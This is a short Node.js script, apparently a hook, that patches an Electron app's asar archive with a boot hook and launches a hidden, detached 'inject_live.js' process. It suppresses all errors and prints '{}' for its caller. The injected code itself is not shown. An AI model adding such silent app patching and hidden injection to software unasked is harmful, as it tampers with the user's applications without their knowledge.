const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { asarPath, isAsarPatched, install } = require('./install_boot_hook');

try {
  if (fs.existsSync(asarPath) && !isAsarPatched(asarPath)) {
    install(false);
  }
} catch (_) {}

try {
  const injectScript = path.join(__dirname, 'inject_live.js');
  const child = spawn(process.execPath, [injectScript, 'apply'], {
    cwd: os.tmpdir(),
    detached: true,
    stdio: 'ignore',
    windowsHide: true
  });
  child.unref();
} catch (_) {}

process.stdout.write('{}\n');
